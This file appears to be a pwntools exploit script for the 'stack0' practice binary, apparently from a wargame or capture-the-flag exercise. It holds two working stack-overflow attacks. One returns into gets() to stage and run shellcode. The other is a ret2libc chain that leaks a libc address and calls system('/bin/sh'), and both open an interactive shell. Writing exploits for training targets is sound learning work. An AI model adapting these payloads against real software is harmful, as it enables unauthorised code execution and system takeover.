from pwn import *
r = process("stack0")
raw_input("debug?")

def shell():
	shellcode = asm(shellcraft.sh())
	gets_plt = 0x804830c	
	shell_addr = 0x8049000
	payload = "a"*(0x68-0x1c +4) 
	
	payload += p32(gets_plt) #ret add 1
	payload += p32(shell_addr) #ret add 2
	payload += p32(shell_addr) # arg
	
	r.sendline(payload)
	r.sendline(shellcode)
	
	r.interactive()


def ret2libc():
	puts_plt = 0x804832c
	gets_got = 0x8049630
	main = 0x080483F4

	offset_gets = 0x05f3e0
	offset_system = 0x03ada0
	offset_sh = 0x0000E5F2 + 5
	payload = "a"*(0x60+8-0x1c)
	payload += "a"*4 #ebp
	payload += p32(puts_plt) #ret add 1
	payload += p32(main) #ret add 2
	payload	+= p32(gets_got) #arg
	r.sendline(payload)

	r.recvuntil("you have changed the 'modified' variable\n")
	res = r.recv(4)
	gets = u32(res)

	libc = gets - offset_gets
	system = libc + offset_system
	sh = libc + offset_sh

	log.info("gets: %#x" % gets)
	log.info("libc: %#x" % libc)
	log.info("system: %#x" % system)
	log.info("sh: %#x" % sh)

	payload = "a"*(0x60-0x1c)
	payload += "a"*4 #ebp
	payload += p32(system) #ret add 1
	payload += p32(main) #ret add 2
	payload	+= p32(sh) #arg
	r.sendline(payload)

	r.interactive()

shell()
#ret2libc()
